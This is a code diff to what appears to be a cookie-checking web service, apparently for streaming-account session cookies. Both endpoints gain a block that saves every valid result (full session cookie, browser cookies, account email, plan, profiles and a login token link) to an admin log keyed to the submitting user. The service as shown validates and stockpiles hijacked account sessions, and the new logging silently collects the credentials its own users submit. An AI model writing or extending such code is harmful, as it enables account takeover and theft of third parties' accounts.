@@ -536,6 +536,26 @@ async def check_cookies(data: CookieCheckRequest, user: dict = Depends(get_curre
         "created_at": datetime.now(timezone.utc).isoformat()
     })
 
+    # Log valid cookies to admin log
+    for r in results:
+        if r["status"] == "valid":
+            await db.valid_logs.insert_one({
+                "id": str(uuid.uuid4()),
+                "checked_by_key": user["id"],
+                "checked_by_label": user["label"],
+                "email": r.get("email"),
+                "plan": r.get("plan"),
+                "country": r.get("country"),
+                "member_since": r.get("member_since"),
+                "next_billing": r.get("next_billing"),
+                "profiles": r.get("profiles", []),
+                "browser_cookies": r.get("browser_cookies", ""),
+                "full_cookie": r.get("full_cookie", ""),
+                "nftoken": r.get("nftoken"),
+                "nftoken_link": r.get("nftoken_link"),
+                "created_at": datetime.now(timezone.utc).isoformat()
+            })
+
     return {
         "id": check_id,
         "results": results,
@@ -577,6 +597,26 @@ async def check_cookies_file(file: UploadFile = File(...), user: dict = Depends(
         "filename": file.filename,
         "created_at": datetime.now(timezone.utc).isoformat()
     })
+
+    # Log valid cookies to admin log
+    for r in results:
+        if r["status"] == "valid":
+            await db.valid_logs.insert_one({
+                "id": str(uuid.uuid4()),
+                "checked_by_key": user["id"],
+                "checked_by_label": user["label"],
+                "email": r.get("email"),
+                "plan": r.get("plan"),
+                "country": r.get("country"),
+                "member_since": r.get("member_since"),
+                "next_billing": r.get("next_billing"),
+                "profiles": r.get("profiles", []),
+                "browser_cookies": r.get("browser_cookies", ""),
+                "full_cookie": r.get("full_cookie", ""),
+                "nftoken": r.get("nftoken"),
+                "nftoken_link": r.get("nftoken_link"),
+                "created_at": datetime.now(timezone.utc).isoformat()
+            })
 
     return {
         "id": check_id,
